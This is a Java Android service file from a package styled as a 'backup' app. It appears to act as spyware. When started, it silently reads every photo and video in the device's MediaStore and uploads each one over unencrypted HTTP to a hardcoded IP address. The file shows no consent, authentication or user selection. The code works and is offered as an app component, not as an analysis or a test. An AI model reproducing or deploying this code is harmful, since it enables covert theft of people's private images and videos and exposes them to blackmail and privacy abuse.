package com.example.yacinestylebackup;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class UploadService extends Service {
    // غيّر هذا إلى رابط السيرفر النهائي عند الحاجة.
    private static final String UPLOAD_URL = "http://145.239.69.111:20245/upload";
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        executor.execute(() -> {
            try {
                // الصور أولاً
                uploadCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Images.Media._ID,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.DATE_ADDED);

                // ثم الفيديوهات
                uploadCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Video.Media._ID,
                        MediaStore.Video.Media.DISPLAY_NAME,
                        MediaStore.Video.Media.DATE_ADDED);
            } finally {
                stopSelf(startId);
            }
        });
        return START_NOT_STICKY;
    }

    private void uploadCollection(Uri collection, String idCol, String nameCol, String dateCol) {
        String[] projection = {idCol, nameCol, dateCol};
        try (Cursor c = getContentResolver().query(collection, projection, null, null, dateCol + " ASC")) {
            if (c == null) return;
            int idIndex = c.getColumnIndexOrThrow(idCol);
            int nameIndex = c.getColumnIndexOrThrow(nameCol);

            while (c.moveToNext()) {
                long id = c.getLong(idIndex);
                String name = c.getString(nameIndex);
                Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));
                uploadOne(uri, name);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void uploadOne(Uri uri, String fileName) {
        HttpURLConnection conn = null;
        try (InputStream raw = getContentResolver().openInputStream(uri);
             BufferedInputStream in = raw == null ? null : new BufferedInputStream(raw)) {
            if (in == null) return;

            String boundary = "----LegendBoundary" + System.currentTimeMillis();
            conn = (HttpURLConnection) new URL(UPLOAD_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(180000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" +
                        safe(fileName) + "\"\r\n");
                out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                byte[] buffer = new byte[8192];
                int n;
                while ((n = in.read(buffer)) != -1) out.write(buffer, 0, n);

                out.writeBytes("\r\n--" + boundary + "--\r\n");
                out.flush();
            }

            int code = conn.getResponseCode();
            if (code < 200 || code >= 300) {
                System.err.println("Upload failed: " + fileName + " HTTP " + code);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private String safe(String s) {
        if (s == null || s.trim().isEmpty()) return "media_file";
        return s.replace("\"", "_");
    }

    @Override public void onDestroy() {
        executor.shutdownNow();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) {
        return null;
    }
}
